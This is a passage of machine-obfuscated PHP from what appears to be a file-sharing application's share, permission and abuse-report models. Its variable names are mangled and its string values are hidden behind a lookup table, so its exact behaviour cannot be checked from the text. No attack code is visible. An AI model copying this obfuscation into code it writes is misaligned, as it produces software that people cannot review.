$_SERVER[ÔÕ±ĞšÎ]; $³°Ñ»ğï = array(array($»ˆÚé[564] => array($»ˆÚé[1091], 0), $»ˆÚé[668] => array($»ˆÚé[1091], 0), $»ˆÚé[2129] => $»ˆÚé[2081])); if ($ò³ µ´ == $»ˆÚé[2130]) { $³°Ñ»ğï = array($»ˆÚé[564] => 1); } else { if ($ò³ µ´ == $»ˆÚé[1244]) { $³°Ñ»ğï = array($»ˆÚé[668] => 1); } } $³°Ñ»ğï[$»ˆÚé[1777]] = USER_ID; $•˜Ùú»¯ = $this->where($³°Ñ»ğï)->selectPage($ÜÄ¤òí¡); return $•˜Ùú»¯; } protected function listToMe($Áú ô·Ù = 300) { $ŞÕãÓ£æ =& $_SERVER[ÔÕ±ĞšÎ]; $‰‰ÏÑëú = Model($ŞÕãÓ£æ[2131])->userGroupParents(USER_ID); $óĞµÑ©¸ = array($ŞÕãÓ£æ[653] => SourceModel::TYPE_USER, $ŞÕãÓ£æ[571] => USER_ID); if ($‰‰ÏÑëú) { $óĞµÑ©¸ = array(array($ŞÕãÓ£æ[653] => SourceModel::TYPE_USER, $ŞÕãÓ£æ[571] => USER_ID), array($ŞÕãÓ£æ[653] => SourceModel::TYPE_GROUP, $ŞÕãÓ£æ[571] => array($ŞÕãÓ£æ[7], $‰‰ÏÑëú)), $ŞÕãÓ£æ[2129] => $ŞÕãÓ£æ[2081]); } $¶ä‡µ’Û = Model($ŞÕãÓ£æ[671])->where($óĞµÑ©¸)->selectPage($Áú ô·Ù); $™ŒšĞÎ = array_to_keyvalue_group($¶ä‡µ’Û[$ŞÕãÓ£æ[447]], $ŞÕãÓ£æ[670]); if (!$™ŒšĞÎ) { return $¶ä‡µ’Û; } $¥‚’‚Ï = $ŞÕãÓ£æ[2132]; $óĞµÑ©¸ = array($ŞÕãÓ£æ[670] => array($ŞÕãÓ£æ[494], array_keys($™ŒšĞÎ)), $ŞÕãÓ£æ[1777] => array($ŞÕãÓ£æ[1093], $ŞÕãÓ£æ[230])); $ºğùĞ£î = $this->field($¥‚’‚Ï)->where($óĞµÑ©¸)->select(); foreach ($ºğùĞ£î as $©­×†öé => &$£å—¿ªó) { $£å—¿ªó[$ŞÕãÓ£æ[2128]] = $™ŒšĞÎ[$£å—¿ªó[$ŞÕãÓ£æ[670]]]; } unset($£å—¿ªó); $Ã‡—²« = array($ŞÕãÓ£æ[2133] => $ºğùĞ£î, $ŞÕãÓ£æ[2134] => $¶ä‡µ’Û[$ŞÕãÓ£æ[444]]); return $Ã‡—²«; } protected function shareAdd($–Íİñç, $¾éÏ€ŸÏ) { $‘›ç´½§ =& $_SERVER[ÔÕ±ĞšÎ]; $šƒÑí = $this->_addShareData($–Íİñç, $¾éÏ€ŸÏ); if (!empty($¾éÏ€ŸÏ[$‘›ç´½§[2135]])) { $this->_shareAuthSet($šƒÑí, $¾éÏ€ŸÏ[$‘›ç´½§[2135]]); } $this->shareEventAdd($–Íİñç, $¾éÏ€ŸÏ, $‘›ç´½§[2136]); return $šƒÑí; } protected function shareAddSystem($ÂÇ…Éù, $¯ÔãÅ¦ˆ) { $„ç¢ù­ò =& $_SERVER[ÔÕ±ĞšÎ]; $²‹¨Ê”á = $this->_addShareData($ÂÇ…Éù, $¯ÔãÅ¦ˆ, $„ç¢ù­ò[191]); $this->_shareAuthSet($²‹¨Ê”á, $¯ÔãÅ¦ˆ[$„ç¢ù­ò[2135]]); return $²‹¨Ê”á; } private function shareEventAdd($ŸÅà¡‡Œ, $ˆØùŸŸÀ, $µÉ‚æ£Ğ = "\141\x64\144") { $ŞñµÉÂà =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ŸÅà¡‡Œ || $ŸÅà¡‡Œ == $ŞñµÉÂà[230]) { return; } if ($µÉ‚æ£Ğ == $ŞñµÉÂà[2136]) { if ($ˆØùŸŸÀ[$ŞñµÉÂà[564]] == $ŞñµÉÂà[91]) { Model($ŞñµÉÂà[638])->eventShare($ŸÅà¡‡Œ, $ŞñµÉÂà[2137]); } if ($ˆØùŸŸÀ[$ŞñµÉÂà[668]] == $ŞñµÉÂà[91]) { Model($ŞñµÉÂà[638])->eventShare($ŸÅà¡‡Œ, $ŞñµÉÂà[2138]); } return; } $ìºâú•ş = $this->getInfoByPath($ŸÅà¡‡Œ); $Ûòäºê¼ = $ŞñµÉÂà[2139]; if ($ìºâú•ş[$ŞñµÉÂà[564]] == $ŞñµÉÂà[230] && $ˆØùŸŸÀ[$ŞñµÉÂà[564]] == $ŞñµÉÂà[91]) { $Ûòäºê¼ = $ŞñµÉÂà[2137]; } if ($ìºâú•ş[$ŞñµÉÂà[564]] == $ŞñµÉÂà[91] && $ˆØùŸŸÀ[$ŞñµÉÂà[564]] == $ŞñµÉÂà[230]) { $Ûòäºê¼ = $ŞñµÉÂà[2140]; } if ($ìºâú•ş[$ŞñµÉÂà[668]] == $ŞñµÉÂà[230] && $ˆØùŸŸÀ[$ŞñµÉÂà[668]] == $ŞñµÉÂà[91]) { $Ûòäºê¼ = $ŞñµÉÂà[2138]; } if ($ìºâú•ş[$ŞñµÉÂà[668]] == $ŞñµÉÂà[91] && $ˆØùŸŸÀ[$ŞñµÉÂà[668]] == $ŞñµÉÂà[230]) { $Ûòäºê¼ = $ŞñµÉÂà[2141]; } Model($ŞñµÉÂà[638])->eventShare($ŸÅà¡‡Œ, $Ûòäºê¼); return; } private function _addShareData($˜œ†Œı, $ª±±™Ï‡ = array(), $†ÛÓ«Ü— = false) { $ä«®çÉæ =& $_SERVER[ÔÕ±ĞšÎ]; $Ãæòªâæ = $†ÛÓ«Ü— == $ä«®çÉæ[191] ? 0 : USER_ID; $­Š„öÔ– = array($ä«®çÉæ[493] => $˜œ†Œı, $ä«®çÉæ[1768] => $Ãæòªâæ); if ($˜œ†Œı == 0) { $­Š„öÔ– = array($ä«®çÉæ[2142] => $ª±±™Ï‡[$ä«®çÉæ[1259]], $ä«®çÉæ[1768] => $Ãæòªâæ); } if ($®Ÿ•æÕŒ = $this->where($­Š„öÔ–)->find()) { return $®Ÿ•æÕŒ[$ä«®çÉæ[670]]; } if ($˜œ†Œı == 0) { $¼Ä´œËÊ = array($ä«®çÉæ[32] => get_path_this($ª±±™Ï‡[$ä«®çÉæ[87]])); } else { $¼Ä´œËÊ = Model($ä«®çÉæ[899])->sourceInfo($˜œ†Œı); if (!$¼Ä´œËÊ) { return !1; } } if (!$ª±±™Ï‡[$ä«®çÉæ[1665]]) { $ª±±™Ï‡[$ä«®çÉæ[1665]] = $¼Ä´œËÊ[$ä«®çÉæ[32]]; } $‚…Ê¸‚¹ = array($ä«®çÉæ[1768] => $Ãæòªâæ, $ä«®çÉæ[493] => $˜œ†Œı, $ä«®çÉæ[1665] => $ä«®çÉæ[12], $ä«®çÉæ[564] => 0, $ä«®çÉæ[668] => 0, $ä«®çÉæ[1259] => $ä«®çÉæ[12], $ä«®çÉæ[384] => $ä«®çÉæ[12], $ä«®çÉæ[968] => $ä«®çÉæ[12], $ä«®çÉæ[2143] => 0, $ä«®çÉæ[2144] => 0, $ä«®çÉæ[835] => 0, $ä«®çÉæ[2145] => $ä«®çÉæ[12], $ä«®çÉæ[2126] => $ä«®çÉæ[12]); $Ü’­é¤½ = explode($ä«®çÉæ[50], $ä«®çÉæ[2146]); foreach ($Ü’­é¤½ as $ÄµÅÀİƒ) { if (!isset($ª±±™Ï‡[$ÄµÅÀİƒ])) { continue; } $‚…Ê¸‚¹[$ÄµÅÀİƒ] = $ª±±™Ï‡[$ÄµÅÀİƒ]; } $ç¢Ë†º = $this->add($‚…Ê¸‚¹); $—Š¤¯Å’ = array($ä«®çÉæ[2126] => short_id($ç¢Ë†º)); $this->where(array($ä«®çÉæ[2147] => $ç¢Ë†º))->save($—Š¤¯Å’); return $ç¢Ë†º; } private function _shareAuthSet($ß™êú¶, $âÌÁê§³) { $ÎóëŸİ¯ =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_array($âÌÁê§³)) { return !1; } $É°²Œ§„ = Model($ÎóëŸİ¯[2091]); $É°²Œ§„->where(array($ÎóëŸİ¯[670] => $ß™êú¶))->delete(); $íÑÄ ñ± = array(); foreach ($âÌÁê§³ as $”÷®‰¢œ) { $ç¶¡÷´ = SourceModel::TYPE_USER; if ($”÷®‰¢œ[$ÎóëŸİ¯[190]] == SourceModel::TYPE_GROUP) { $ç¶¡÷´ = SourceModel::TYPE_GROUP; } $¯÷Ï½Ë = array($ÎóëŸİ¯[670] => $ß™êú¶, $ÎóëŸİ¯[190] => $ç¶¡÷´, $ÎóëŸİ¯[571] => intval($”÷®‰¢œ[$ÎóëŸİ¯[571]]), $ÎóëŸİ¯[2087] => 0, $ÎóëŸİ¯[2148] => -1); if ($”÷®‰¢œ[$ÎóëŸİ¯[2087]]) { $¯÷Ï½Ë[$ÎóëŸİ¯[2087]] = $”÷®‰¢œ[$ÎóëŸİ¯[2087]]; } else { if ($”÷®‰¢œ[$ÎóëŸİ¯[2148]]) { $¯÷Ï½Ë[$ÎóëŸİ¯[2148]] = $”÷®‰¢œ[$ÎóëŸİ¯[2148]]; } } $íÑÄ ñ±[] = $¯÷Ï½Ë; } return $É°²Œ§„->addAll($íÑÄ ñ±, array(), !0); } public function numViewAdd($ÊñåİŠ…) { $ñ ÙÇ° =& $_SERVER[ÔÕ±ĞšÎ]; $Í¶„ƒÏ‘ = array($ñ ÙÇ°[2147] => $ÊñåİŠ…); $this->where($Í¶„ƒÏ‘)->setAdd($ñ ÙÇ°[2143]); } public function numDownloadAdd($İ™şı) { $š«‘Å«¸ =& $_SERVER[ÔÕ±ĞšÎ]; $Á®Ö”¡ğ = array($š«‘Å«¸[2147] => $İ™şı); $this->where($Á®Ö”¡ğ)->setAdd($š«‘Å«¸[2144]); } protected function shareEdit($•ôãĞ›, $Ù¸”„) { $º¶„Ô¢Ú =& $_SERVER[ÔÕ±ĞšÎ]; $ƒ×¯ì© = $this->getInfo($•ôãĞ›); if (!$ƒ×¯ì©) { return !1; } $this->_checkLinkShare($Ù¸”„, $ƒ×¯ì©); $çÁ¿Şâ = array(); $Áùùº­¨ = explode($º¶„Ô¢Ú[50], $º¶„Ô¢Ú[2149]); foreach ($Áùùº­¨ as $½ÔœÄ°Ó) { if (!array_key_exists($½ÔœÄ°Ó, $Ù¸”„)) { continue; } $çÁ¿Şâ[$½ÔœÄ°Ó] = $Ù¸”„[$½ÔœÄ°Ó]; } $this->shareEventAdd($ƒ×¯ì©[$º¶„Ô¢Ú[193]], $Ù¸”„, $º¶„Ô¢Ú[1947]); $this->where(array($º¶„Ô¢Ú[2147] => $•ôãĞ›))->save($çÁ¿Şâ); if (isset($Ù¸”„[$º¶„Ô¢Ú[2135]])) { $this->_shareAuthSet($•ôãĞ›, $Ù¸”„[$º¶„Ô¢Ú[2135]]); } return !0; } private function _checkLinkShare($èÏĞ–€ó, $Ôª¬¦¼À) { $¸ÊŒğ„Š =& $_SERVER[ÔÕ±ĞšÎ]; if ($èÏĞ–€ó[$¸ÊŒğ„Š[564]] != $¸ÊŒğ„Š[91]) { return; } $£ø²Ô¡¦ = $Ôª¬¦¼À[$¸ÊŒğ„Š[90]][$¸ÊŒğ„Š[193]]; if ($Ôª¬¦¼À[$¸ÊŒğ„Š[90]][$¸ÊŒğ„Š[33]] != $¸ÊŒğ„Š[232]) { $ªÛ€¿…¥ = $this->_folderReport($£ø²Ô¡¦); if (!$ªÛ€¿…¥) { return; } show_json(LNG($¸ÊŒğ„Š[2150]) . $¸ÊŒğ„Š[2151] . $ªÛ€¿…¥, !1); } $ğıŠµÜ = Model($¸ÊŒğ„Š[899])->fileInfoGet($Ôª¬¦¼À[$¸ÊŒğ„Š[90]][$¸ÊŒğ„Š[193]]); if (!$ğıŠµÜ) { return; } $äº‘¦û = $this->shareFileMeta($ğıŠµÜ[$¸ÊŒğ„Š[543]]); if (isset($äº‘¦û[$¸ÊŒğ„Š[452]]) && $äº‘¦û[$¸ÊŒğ„Š[452]] == $¸ÊŒğ„Š[91]) { show_json(LNG($¸ÊŒğ„Š[2152]), !1); } } private function _folderReport($™œ ±‰È) { $ö²ìÁ¨ =& $_SERVER[ÔÕ±ĞšÎ]; $™ÅÃûš† = array($ö²ìÁ¨[543] => array($ö²ìÁ¨[1091], 0), $ö²ìÁ¨[824] => 3); $¸‰œ™×° = Model($ö²ìÁ¨[2153])->where($™ÅÃûš†)->field($ö²ìÁ¨[543])->select(); if (!$¸‰œ™×°) { return !1; } $¸‰œ™×° = array_to_keyvalue($¸‰œ™×°, $ö²ìÁ¨[12], $ö²ìÁ¨[543]); $™¹Ö¯º¾ = $ö²ìÁ¨[50] . $™œ ±‰È . $ö²ìÁ¨[50]; $™ÅÃûš† = array($ö²ìÁ¨[543] => array($ö²ìÁ¨[7], $¸‰œ™×°), $ö²ìÁ¨[586] => array($ö²ìÁ¨[461], "\x25{$™¹Ö¯º¾}\45"), $ö²ìÁ¨[507] => 0); $ˆ®‚Øø = Model($ö²ìÁ¨[899])->where($™ÅÃûš†)->field($ö²ìÁ¨[2154])->find(); if (!$ˆ®‚Øø) { return !1; } $ŸòÑ„”‘ = substr($ˆ®‚Øø[$ö²ìÁ¨[586]], strpos($ˆ®‚Øø[$ö²ìÁ¨[586]], $™¹Ö¯º¾)); $™ÅÃûš† = array($ö²ìÁ¨[193] => array($ö²ìÁ¨[7], trim($ŸòÑ„”‘, $ö²ìÁ¨[50]))); $À†™­Åò = Model($ö²ìÁ¨[899])->where($™ÅÃûš†)->field($ö²ìÁ¨[32])->select(); $¯ŞƒŠºÚ = array_to_keyvalue($À†™­Åò, $ö²ìÁ¨[12], $ö²ìÁ¨[32]); $¯ŞƒŠºÚ[] = $ˆ®‚Øø[$ö²ìÁ¨[32]]; return implode($ö²ìÁ¨[8], $¯ŞƒŠºÚ); } protected function remove($’Ø÷Ì¸—) { $ŸìÖ©ÎÔ =& $_SERVER[ÔÕ±ĞšÎ]; $²ï¸ò®® = is_array($’Ø÷Ì¸—) ? $’Ø÷Ì¸— : array($’Ø÷Ì¸—); for ($ˆë­¼»– = 0; $ˆë­¼»– < count($²ï¸ò®®); $ˆë­¼»–++) { $Ç£™ö = $this->getInfo($²ï¸ò®®[$ˆë­¼»–]); if ($Ç£™ö[$ŸìÖ©ÎÔ[668]] == $ŸìÖ©ÎÔ[91]) { Model($ŸìÖ©ÎÔ[638])->eventShare($Ç£™ö[$ŸìÖ©ÎÔ[193]], $ŸìÖ©ÎÔ[2141]); } if ($Ç£™ö[$ŸìÖ©ÎÔ[564]] == $ŸìÖ©ÎÔ[91]) { Model($ŸìÖ©ÎÔ[638])->eventShare($Ç£™ö[$ŸìÖ©ÎÔ[193]], $ŸìÖ©ÎÔ[2140]); } } if (is_array($’Ø÷Ì¸—)) { $’Ø÷Ì¸— = array($ŸìÖ©ÎÔ[7], $’Ø÷Ì¸—); } $ÉƒöÅ¯± = array($ŸìÖ©ÎÔ[670] => $’Ø÷Ì¸—); $§–•»¹“ = $this->where($ÉƒöÅ¯±)->delete(); if ($§–•»¹“) { Model($ŸìÖ©ÎÔ[671])->where(array($ŸìÖ©ÎÔ[670] => $’Ø÷Ì¸—))->delete(); } return $§–•»¹“; } protected function removeBySource($„ƒµ«±ß) { $ƒ¨£Ù¾š =& $_SERVER[ÔÕ±ĞšÎ]; $ÏÛñ©ô£ = array($ƒ¨£Ù¾š[493] => array($ƒ¨£Ù¾š[494], $„ƒµ«±ß)); $àµŠô²“ = $this->field($ƒ¨£Ù¾š[670])->where($ÏÛñ©ô£)->select(); $àµŠô²“ = array_to_keyvalue($àµŠô²“, $ƒ¨£Ù¾š[12], $ƒ¨£Ù¾š[670]); if (!$àµŠô²“) { return; } $ÏÛñ©ô£ = array($ƒ¨£Ù¾š[2147] => array($ƒ¨£Ù¾š[494], $àµŠô²“)); $this->where($ÏÛñ©ô£)->delete(); Model($ƒ¨£Ù¾š[671])->where($ÏÛñ©ô£)->delete(); } public function listAll($Ñ¾„¨æÁ) { $æôĞÃ— =& $_SERVER[ÔÕ±ĞšÎ]; $—£ôØñ = array(); if ($Ñ¾„¨æÁ[$æôĞÃ—[1777]]) { $—£ôØñ[$æôĞÃ—[1777]] = $Ñ¾„¨æÁ[$æôĞÃ—[1777]]; } if ($Ñ¾„¨æÁ[$æôĞÃ—[834]]) { $Íò¦Ï’Ÿ = $Ñ¾„¨æÁ[$æôĞÃ—[835]] ? $Ñ¾„¨æÁ[$æôĞÃ—[835]] : strtotime(date($æôĞÃ—[2155])); $—£ôØñ[$æôĞÃ—[233]] = array($æôĞÃ—[410], array($Ñ¾„¨æÁ[$æôĞÃ—[834]], $Íò¦Ï’Ÿ)); } if ($Ñ¾„¨æÁ[$æôĞÃ—[33]]) { $—£ôØñ[$Ñ¾„¨æÁ[$æôĞÃ—[33]]] = 1; } else { $—£ôØñ[] = array($æôĞÃ—[564] => array($æôĞÃ—[1091], 0), $æôĞÃ—[668] => array($æôĞÃ—[1091], 0), $æôĞÃ—[2129] => $æôĞÃ—[2081]); } if ($Ñ¾„¨æÁ[$æôĞÃ—[2077]]) { $—£ôØñ[] = array($æôĞÃ—[2126] => $Ñ¾„¨æÁ[$æôĞÃ—[2077]], $æôĞÃ—[1665] => array($æôĞÃ—[461], "\45{$Ñ¾„¨æÁ[$æôĞÃ—[2077]]}\x25"), $æôĞÃ—[2129] => $æôĞÃ—[2081]); } $•ÌŠã×Î = $this->_makeOrder()->where($—£ôØñ)->selectPage(20); if (empty($•ÌŠã×Î[$æôĞÃ—[447]])) { return array(); } $this->_listDataApply($•ÌŠã×Î[$æôĞÃ—[447]]); return $•ÌŠã×Î; } public function listDataApply($œÎÅß¯å) { $this->_listDataApply($œÎÅß¯å); return $œÎÅß¯å; } private function _listDataApply(&$Š¡‰ÅëÜ) { $¼§’ŠÙ‘ =& $_SERVER[ÔÕ±ĞšÎ]; $Ïàü›Öû = array_to_keyvalue($Š¡‰ÅëÜ, $¼§’ŠÙ‘[12], $¼§’ŠÙ‘[1777]); $±‰ğÕœ = Model($¼§’ŠÙ‘[599])->userListInfo(array_unique($Ïàü›Öû)); $Ú³•Ù¸ = array_to_keyvalue($Š¡‰ÅëÜ, $¼§’ŠÙ‘[12], $¼§’ŠÙ‘[193]); $åãì‚ó¢ = Model($¼§’ŠÙ‘[899])->sourceListInfo($Ú³•Ù¸, !0); foreach ($Š¡‰ÅëÜ as $´ÑÁ‹¹Œ => &$ê¾åçÂ) { $ğ›‘ Ïã = $ê¾åçÂ[$¼§’ŠÙ‘[1777]]; $ê¾åçÂ[$¼§’ŠÙ‘[2156]] = $±‰ğÕœ[$ğ›‘ Ïã] ? $±‰ğÕœ[$ğ›‘ Ïã] : !1; $ÎÅ³ÎÎŒ = $ê¾åçÂ[$¼§’ŠÙ‘[193]]; $ê¾åçÂ[$¼§’ŠÙ‘[90]] = $åãì‚ó¢[$ÎÅ³ÎÎŒ] ? $åãì‚ó¢[$ÎÅ³ÎÎŒ] : !1; if ($ê¾åçÂ[$¼§’ŠÙ‘[90]][$¼§’ŠÙ‘[507]] == $¼§’ŠÙ‘[91]) { unset($Š¡‰ÅëÜ[$´ÑÁ‹¹Œ]); } if ($ê¾åçÂ[$¼§’ŠÙ‘[90]] != $¼§’ŠÙ‘[230] && !$ê¾åçÂ[$¼§’ŠÙ‘[90]]) { unset($Š¡‰ÅëÜ[$´ÑÁ‹¹Œ]); } } unset($ê¾åçÂ); $Š¡‰ÅëÜ = array_values($Š¡‰ÅëÜ); } private function _makeOrder($Ö¾ì› = '') { $±Ù€¶ˆÂ =& $_SERVER[ÔÕ±ĞšÎ]; $©¶Şôíó = array($±Ù€¶ˆÂ[233], $±Ù€¶ˆÂ[835], $±Ù€¶ˆÂ[2143], $±Ù€¶ˆÂ[2144]); $‡­ĞğˆÀ = array($±Ù€¶ˆÂ[525] => $±Ù€¶ˆÂ[526], $±Ù€¶ˆÂ[527] => $±Ù€¶ˆÂ[528]); $­ãÍ—ë¬ = Input::get($±Ù€¶ˆÂ[532], $±Ù€¶ˆÂ[7], $±Ù€¶ˆÂ[499], $©¶Şôíó); $ë®¨ÏİÖ = Input::get($±Ù€¶ˆÂ[533], $±Ù€¶ˆÂ[7], $±Ù€¶ˆÂ[2157], array($±Ù€¶ˆÂ[2074], $±Ù€¶ˆÂ[527])); $ë®¨ÏİÖ = $‡­ĞğˆÀ[$ë®¨ÏİÖ]; $Ö¾ì› = $Ö¾ì› . "{$­ãÍ—ë¬}\x20{$ë®¨ÏİÖ}"; return $this->order($Ö¾ì›); } public function reportAdd($‰¦æ ¾ğ) { $«¼Æƒ€œ =& $_SERVER[ÔÕ±ĞšÎ]; $çÛÔ¼¯Ç = array($«¼Æƒ€œ[670] => $‰¦æ ¾ğ[$«¼Æƒ€œ[670]], $«¼Æƒ€œ[1777] => USER_ID); if (Model($«¼Æƒ€œ[2153])->where($çÛÔ¼¯Ç)->find()) { return !1; } $âãıßŸí = array($«¼Æƒ€œ[670] => $‰¦æ ¾ğ[$«¼Æƒ€œ[670]], $«¼Æƒ€œ[1665] => $‰¦æ ¾ğ[$«¼Æƒ€œ[1665]], $«¼Æƒ€œ[193] => $‰¦æ ¾ğ[$«¼Æƒ€œ[193]], $«¼Æƒ€œ[543] => $‰¦æ ¾ğ[$«¼Æƒ€œ[543]], $«¼Æƒ€œ[1777] => USER_ID, $«¼Æƒ€œ[33] => $‰¦æ ¾ğ[$«¼Æƒ€œ[33]], $«¼Æƒ€œ[528] => $‰¦æ ¾ğ[$«¼Æƒ€œ[528]]); return Model($«¼Æƒ€œ[2153])->add($âãıßŸí); } public function reportList($Ì˜´¾¥) { $£ÒÚª™ =& $_SERVER[ÔÕ±ĞšÎ]; $ûõŒ¹ò = array(); if ($Ì˜´¾¥[$£ÒÚª™[834]]) { $åìÆ‘Ö = $Ì˜´¾¥[$£ÒÚª™[835]] ? $Ì˜´¾¥[$£ÒÚª™[835]] : strtotime(date($£ÒÚª™[2155])); $ûõŒ¹ò[$£ÒÚª™[233]] = array($£ÒÚª™[410], array($Ì˜´¾¥[$£ÒÚª™[834]], $åìÆ‘Ö)); } if (isset($Ì˜´¾¥[$£ÒÚª™[33]]) && in_array($Ì˜´¾¥[$£ÒÚª™[33]], array($£ÒÚª™[91], $£ÒÚª™[512], $£ÒÚª™[2158], $£ÒÚª™[2159], $£ÒÚª™[2160]))) { $ûõŒ¹ò[$£ÒÚª™[33]] = $Ì˜´¾¥[$£ÒÚª™[33]]; } if (isset($Ì˜´¾¥[$£ÒÚª™[824]]) && in_array($Ì˜´¾¥[$£ÒÚª™[824]], array($£ÒÚª™[230], $£ÒÚª™[91], $£ÒÚª™[512], $£ÒÚª™[2158]))) { $ûõŒ¹ò[$£ÒÚª™[824]] = $Ì˜´¾¥[$£ÒÚª™[824]]; } $êÑêÑ­… = Input::get($£ÒÚª™[533], $£ÒÚª™[7], $£ÒÚª™[2157], array($£ÒÚª™[2074], $£ÒÚª™[527])); $†ìÓ•ıØ = array($£ÒÚª™[525] => $£ÒÚª™[526], $£ÒÚª™[527] => $£ÒÚª™[528]); $¶›ÊÀöë = $£ÒÚª™[2161] . $†ìÓ•ıØ[$êÑêÑ­…]; $î¹²Ñï– = Model($£ÒÚª™[2153])->where($ûõŒ¹ò)->order($¶›ÊÀöë)->selectPage(20); if (empty($î¹²Ñï–[$£ÒÚª™[447]])) { return array(); } $Ôö¸ôîò = array_to_keyvalue_group($î¹²Ñï–[$£ÒÚª™[447]], $£ÒÚª™[824], $£ÒÚª™[670]); if (!empty($Ôö¸ôîò[0])) { $Ì˜´¾¥ = $Ôö¸ôîò[0]; $ûõŒ¹ò = array($£ÒÚª™[670] => array($£ÒÚª™[7], $Ì˜´¾¥)); $˜Çõ€» = $this->where($ûõŒ¹ò)->field($£ÒÚª™[670])->select(); $˜Çõ€» = array_to_keyvalue($˜Çõ€», $£ÒÚª™[12], $£ÒÚª™[670]); $Ğœ‡ó·« = array_diff($Ì˜´¾¥, $˜Çõ€»); if (!empty($Ğœ‡ó·«)) { foreach ($î¹²Ñï–[$£ÒÚª™[447]] as $™³Éßú« => $¾çÕ‹ì²) { if (in_array($¾çÕ‹ì²[$£ÒÚª™[670]], $Ğœ‡ó·«)) { unset($î¹²Ñï–[$£ÒÚª™[447]][$™³Éßú«]); } } } } $this->_listDataApply($î¹²Ñï–[$£ÒÚª™[447]]); return $î¹²Ñï–; } public function reportStatus($¼¢¢ÖæÍ) { $¸†©êø =& $_SERVER[ÔÕ±ĞšÎ]; $æå¥ë¯Å = array($¸†©êø[477] => $¼¢¢ÖæÍ[$¸†©êø[477]]); $²±¾çÓ = Model($¸†©êø[2153])->where($æå¥ë¯Å)->field($¸†©êø[2162])->find(); if (!$²±¾çÓ) { return !1; } $Şâ§¡« = array($¸†©êø[824] => $¼¢¢ÖæÍ[$¸†©êø[824]]); if ($¼¢¢ÖæÍ[$¸†©êø[824]] == $¸†©êø[2158] && $²±¾çÓ[$¸†©êø[824]] == $¸†©êø[2158]) { $Şâ§¡«[$¸†©êø[824]] = 0; } $Ó¼‡ÎÍ = Model($¸†©êø[2153])->where($æå¥ë¯Å)->save($Şâ§¡«); if ($¼¢¢ÖæÍ[$¸†©êø[824]] == $¸†©êø[512]) { if ($²±¾çÓ[$¸†©êø[543]] != $¸†©êø[230] && $this->shareFileMeta($²±¾çÓ[$¸†©êø[543]])) { $this->shareFileMeta($²±¾çÓ[$¸†©êø[543]], 0); } $this->remove($²±¾çÓ[$¸†©êø[670]]); return !0; } if ($Ó¼‡ÎÍ && $¼¢¢ÖæÍ[$¸†©êø[824]] == $¸†©êø[2158]) { $˜é§´Ò” = $Şâ§¡«[$¸†©êø[824]] == $¸†©êø[2158] ? 1 : 0; $this->shareFileMeta($²±¾çÓ[$¸†©êø[543]], $˜é§´Ò”); $this->removeByFile($²±¾çÓ[$¸†©êø[543]]); } return $Ó¼‡ÎÍ; } private function removeByFile($¤âª´Çü) { $œƒŞ» ¹ =& $_SERVER[ÔÕ±ĞšÎ]; $¾·îãŠÜ = Model($œƒŞ» ¹[899])->where(array($œƒŞ» ¹[543] => $¤âª´Çü))->field($œƒŞ» ¹[193])->select(); $‡Å©íä = array_to_keyvalue($¾·îãŠÜ, $œƒŞ» ¹[12], $œƒŞ» ¹[193]); $‡Í‘í´í = array($œƒŞ» ¹[193] => array($œƒŞ» ¹[7], $‡Å©íä), $œƒŞ» ¹[564] => 1); $¾·îãŠÜ = $this->where($‡Í‘í´í)->field($œƒŞ» ¹[670])->select(); if (empty($¾·îãŠÜ)) { return; } $Ãµ—ÛÔ = array_to_keyvalue($¾·îãŠÜ, $œƒŞ» ¹[12], $œƒŞ» ¹[670]); $this->remove($Ãµ—ÛÔ); } private function shareFileMeta($‚ìÀŞ™, $§±ƒø—ë = null) { $Šº¯üŠ =& $_SERVER[ÔÕ±ĞšÎ]; $¯×ÆŒéò = array($Šº¯üŠ[543] => $‚ìÀŞ™, $Šº¯üŠ[97] => $Šº¯üŠ[2163]); if (is_null($§±ƒø—ë)) { return Model($Šº¯üŠ[2164])->where($¯×ÆŒéò)->find(); } $¯×ÆŒéò[$Šº¯üŠ[452]] = $§±ƒø—ë; Model($Šº¯üŠ[2164])->add($¯×ÆŒéò, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\145\x5f\x61\165\x74\150"; public function getAuth($Õë§ñšÙ) { $¦Ú†€ô =& $_SERVER[ÔÕ±ĞšÎ]; $©ØšÙ° = $this->sourceAuthSelect($Õë§ñšÙ); $ÃÑÖ »œ = array(); $úÏÙü² = array(); $Å×ŞÖ»ã = 2 << 25; foreach ($©ØšÙ° as $é¦»ï‚´) { $‹»‚ßÖ– = Model($¦Ú†€ô[573])->listData($é¦»ï‚´[$¦Ú†€ô[2087]]); if (!$‹»‚ßÖ–) { continue; } $ÃÑÖ »œ[] = $é¦»ï‚´; $Ùãò÷çû = 0; if ($é¦»ï‚´[$¦Ú†€ô[190]] == SourceModel::TYPE_GROUP) { $Ùãò÷çû = $Å×ŞÖ»ã * 2; } if ($é¦»ï‚´[$¦Ú†€ô[190]] == SourceModel::TYPE_USER) { $Ùãò÷çû = $Å×ŞÖ»ã; } if ($é¦»ï‚´[$¦Ú†€ô[190]] == SourceModel::TYPE_USER && $é¦»ï‚´[$¦Ú†€ô[571]] == $¦Ú†€ô[230]) { $Ùãò÷çû = 0; } $úÏÙü²[] = $‹»‚ßÖ–[$¦Ú†€ô[489]] + $Ùãò÷çû; } array_multisort($úÏÙü², SORT_DESC, $ÃÑÖ »œ); return $ÃÑÖ »œ; } public function sourceAuthSelect($Âş˜ÇÌ×) { $ŒÁĞ±©ö =& $_SERVER[ÔÕ±ĞšÎ]; static $ß×»É¨Œ = array(); $Ú±ğ’ = is_array($Âş˜ÇÌ×) ? !1 : !0; if ($Ú±ğ’) { $Âş˜ÇÌ× = array($Âş˜ÇÌ×); } $òÈ­ä¦¨ = array(); foreach ($Âş˜ÇÌ× as $Ô°†…µ™) { if (isset($ß×»É¨Œ[$Ô°†…µ™])) { $òÈ­ä¦¨[$Ô°†…µ™] = $ß×»É¨Œ[$Ô°†…µ™]; } } if (count($òÈ­ä¦¨) == count($Âş˜ÇÌ×)) { return $Ú±ğ’ ? $òÈ­ä¦¨[$Âş˜ÇÌ×[0]] : $òÈ­ä¦¨; } $÷òªãú = $ŒÁĞ±©ö[2165]; $§Ø‚™£ = array($ŒÁĞ±©ö[193] => array($ŒÁĞ±©ö[7], $Âş˜ÇÌ×)); $¡Ï·å©ú = $this->field($÷òªãú)->order($ŒÁĞ±©ö[477])->where($§Ø‚™£)->select(); $¾ÑÁïŒ¡ = array_to_keyvalue_group($¡Ï·å©ú, 